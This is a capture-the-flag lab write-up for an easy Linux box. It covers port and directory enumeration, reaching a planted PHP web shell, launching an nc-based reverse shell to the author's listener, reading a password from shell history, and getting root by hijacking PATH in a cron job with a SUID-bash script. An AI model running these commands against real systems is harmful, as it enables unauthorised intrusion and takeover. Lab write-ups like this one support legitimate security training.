# Writeup: Hacker vs. Hacker

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Wed Sep  3 11:08:40 2025 as: /usr/lib/nmap/nmap -sS -sVC -vv -Pn -T4 -p- -oN nmap_scan 10.10.23.95
Nmap scan report for 10.10.23.95
Host is up, received user-set (0.072s latency).
Scanned at 2025-09-03 11:08:41 UTC for 105s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  3 11:10:26 2025 -- 1 IP address (1 host up) scanned in 106.10 seconds
```

## 💥 Exploitation:

On port 80 I found a webpage with an upload form. I tried to upload a test image file and got this as response:

```html
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

In the sourcecode I found a hint, that uploaded stuff goes in to the `/cvs` directory. 

```html
<!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->
```

I have done a Gobuster scan on `/cvs` for php files.

```shell
gobuster dir -u http://10.10.23.95/cvs/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o gobuster_scan -t 40 -x pdf.php,php
```

I found a file named `shell.pdf.php`.

```
/shell.pdf.php        (Status: 200) [Size: 18]
```

Now I had to find the right query parameter. Normally I had to fuzz for it but I tried `?cmd=` and it worked. So I started a netcat listener on my host and I started a reverse shell via the backdoor. I have done this with Burpsuites repeater.

```shell
nc -lvnp 4444
```

```http
GET /cvs/shell.pdf.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.23.169.198+4444+>/tmp/f
Host: 10.10.23.95
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0S X 10.15; rv: 143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

I got a shell as `www-data` user. I tried to upgrade my shell via:

```shell
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

but it gets killed instandly with the message "nope".

I looked for other users and changed into `lachlans` home directory, which is world readable, where i found the first flag, `user.txt`.

```shell
$ cat user.txt
```

## 🔓 Priviledge Escalation:

I found the password of the user `lachlan`in the `.bash_history`.

```shell
$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisisthe******\nthisisthe******" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

I changed to the user `lachlan` using `su lachlan` and inspected the cronjob i found in the `.bash_history`.

```shell
$ cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

Since the `$PATH` is set to `/home/lachlan/bin:/bin:/usr/bin` and `pkill` does not use a absolute path, i was able to escalate my priviledges to root by setting the SUID bit on the `bash` binary.

```shell
$ cd ~/bin
$ echo "#!/bin/bash" > pkill
$ echo "chmod +s /bin/bash" >> pkill
$ chmod +x pkill
```

I just had to wait for a moment and then run `bash`.

```shell
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
$ /bin/bash -p
id
uid=1001(lachlan) gid=1001(lachlan) euid=0(root) egid=0(root) groups=0(root),1001(lachlan)
cd /root
cat root.txt
```

## 💰 Loot:

```shell
# user.txt
thm{af7e46b68081d4025c5ce1**********}

# root.txt
thm{7b708e5224f666d3562647**********}
```